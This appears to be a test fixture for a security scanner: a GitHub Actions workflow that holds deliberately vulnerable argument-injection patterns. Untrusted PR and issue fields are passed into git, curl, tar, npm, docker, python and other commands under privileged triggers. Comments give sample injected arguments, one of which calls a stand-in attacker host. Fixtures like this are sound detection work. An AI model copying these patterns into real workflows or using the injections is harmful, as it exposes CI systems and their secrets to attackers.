@@ -1,0 +1,137 @@
+name: Argument Injection - Vulnerable Patterns
+on:
+  # Privileged triggers (critical severity)
+  pull_request_target:
+    types: [opened, synchronize]
+  workflow_run:
+    workflows: ["CI"]
+    types: [completed]
+  issue_comment:
+    types: [created]
+
+jobs:
+  # CRITICAL: Git command with untrusted branch ref
+  # Attack: `--output=/etc/passwd` as branch name
+  unsafe-git-diff:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Git diff with untrusted ref
+        run: git diff ${{ github.event.pull_request.head.ref }}
+
+  # CRITICAL: Git command with untrusted head_ref
+  # Attack: `--upload-pack="curl attacker.com"` as ref
+  unsafe-git-fetch:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Git fetch with untrusted ref
+        run: git fetch origin ${{ github.head_ref }}
+
+  # CRITICAL: Curl with untrusted URL
+  # Attack: `-o /etc/passwd` as part of the title
+  unsafe-curl:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Curl with untrusted input
+        run: curl https://api.example.com/${{ github.event.pull_request.title }}
+
+  # CRITICAL: Wget with untrusted filename
+  # Attack: `--output-document=/root/.bashrc` as label
+  unsafe-wget:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Wget with untrusted input
+        run: wget -O file.txt https://example.com/${{ github.event.pull_request.head.label }}
+
+  # CRITICAL: Tar extraction with untrusted path
+  # Attack: `--to-command="malicious script"` injection
+  unsafe-tar:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Tar with untrusted input
+        run: tar -xf archive.tar -C ${{ github.event.pull_request.head.ref }}
+
+  # CRITICAL: NPM with untrusted package name
+  # Attack: `--scripts-prepend-node-path=malicious` injection
+  unsafe-npm:
+    runs-on: ubuntu-latest
+    steps:
+      - name: NPM install with untrusted input
+        run: npm install ${{ github.event.issue.title }}
+
+  # CRITICAL: Docker with untrusted tag
+  # Attack: `--privileged` injection via tag
+  unsafe-docker:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Docker run with untrusted input
+        run: docker run myimage:${{ github.event.pull_request.head.ref }}
+
+  # CRITICAL: Kubectl with untrusted namespace
+  # Attack: `--kubeconfig=/sensitive/path` injection
+  unsafe-kubectl:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Kubectl with untrusted input
+        run: kubectl get pods -n ${{ github.event.pull_request.title }}
+
+  # CRITICAL: Python with untrusted script path
+  # Attack: `-c "import os; os.system('malicious')"` injection
+  unsafe-python:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Python with untrusted input
+        run: python ${{ github.event.issue.body }}
+
+  # CRITICAL: Multiple commands on single line
+  unsafe-multiline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Multiple vulnerable commands
+        run: |
+          git checkout ${{ github.event.pull_request.head.ref }}
+          git log ${{ github.head_ref }}
+          curl -s ${{ github.event.pull_request.title }}
+
+  # CRITICAL: Command with complex argument structure
+  unsafe-complex:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Complex command with untrusted input
+        run: |
+          git diff --stat ${{ github.event.pull_request.head.ref }} main
+
+  # CRITICAL: AWS CLI with untrusted bucket name
+  # Attack: `--profile attacker` injection
+  unsafe-aws:
+    runs-on: ubuntu-latest
+    steps:
+      - name: AWS S3 with untrusted input
+        run: aws s3 ls s3://${{ github.event.pull_request.title }}
+
+  # CRITICAL: gh CLI with untrusted PR number
+  # Attack: `--repo attacker/repo` injection
+  unsafe-gh:
+    runs-on: ubuntu-latest
+    steps:
+      - name: gh CLI with untrusted input
+        run: gh pr view ${{ github.event.issue.title }}
+
+  # CRITICAL: rsync with untrusted destination
+  # Attack: `--rsh="malicious command"` injection
+  unsafe-rsync:
+    runs-on: ubuntu-latest
+    steps:
+      - name: rsync with untrusted input
+        run: rsync -av ./src/ ${{ github.event.pull_request.head.ref }}/
+
+  # CRITICAL: make with untrusted target
+  # Attack: `-C /dangerous/path` injection
+  unsafe-make:
+    runs-on: ubuntu-latest
+    steps:
+      - name: make with untrusted input
+        run: make ${{ github.event.issue.title }}
